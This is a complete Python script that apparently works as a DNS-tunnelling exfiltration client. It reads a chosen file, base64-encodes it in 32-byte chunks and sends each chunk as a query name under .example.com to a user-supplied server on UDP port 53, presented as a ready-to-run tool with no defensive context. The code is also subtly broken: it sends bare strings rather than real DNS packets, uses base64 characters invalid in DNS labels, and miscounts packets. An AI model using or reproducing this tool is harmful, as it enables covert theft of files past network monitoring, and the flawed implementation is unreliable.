import sys
import socket
import base64
import time

# Constants
PAYLOAD_SIZE = 32  # Maximum payload size for DNS query
DOMAIN_SUFFIX = ".example.com"  # Suffix for the domain name

def read_file(filename):
    try:
        with open(filename, 'rb') as file:
            content = file.read()
            return content
    except FileNotFoundError:
        print("Error: File not found.")
        sys.exit(1)

def create_dns_query(data, index):
    data_chunk = data[index : index + PAYLOAD_SIZE]
    data_b64 = base64.b64encode(data_chunk).decode()
    query = f"{data_b64}.{index}{DOMAIN_SUFFIX}"
    return query

def send_dns_query(query, server_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(query.encode(), (server_ip, 53))
    sock.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: python client.py <file_name> <server_ip>")
        sys.exit(1)

    filename = sys.argv[1]
    server_ip = sys.argv[2]

    # Read file content
    file_content = read_file(filename)
    total_size = len(file_content)

    print(f"Total number of packets to send: {total_size // PAYLOAD_SIZE + 1}")

    # Send data in chunks
    index = 0
    while index < total_size:
        query = create_dns_query(file_content, index)
        print(f"Sending packet {index // PAYLOAD_SIZE + 1} out of {total_size // PAYLOAD_SIZE + 1}")
        print("Data sent:", query)
        send_dns_query(query, server_ip)
        index += PAYLOAD_SIZE
        time.sleep(1)

    print("File sent successfully.")

if __name__ == "__main__":
    main()
